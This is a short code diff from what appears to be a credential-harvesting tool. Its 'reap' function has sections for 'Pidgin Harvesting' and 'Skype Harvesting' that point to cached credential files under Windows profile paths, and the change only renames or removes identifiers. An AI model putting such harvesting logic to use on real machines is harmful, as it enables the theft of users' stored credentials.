@@ -51,7 +51,7 @@ def reap(d):
 		Pidgin Harvesting
 	"""
 
-	rpr_name = "pidgin"
+	rpr_name = "im"
 	desc     = "Pidgin cached credentials file"
 	appdata_xp = "/Documents and Settings"
 	appdata_vi = "/Users"
@@ -93,7 +93,6 @@ def reap(d):
 		Skype Harvesting
 	"""
 
-	rpr_name = "skype"
 	desc     = "Skype cached credentials file"
 	skype_xp_1 = "/Documents and Settings/"
 	skype_xp_2 = "/Application Data/Skype/"
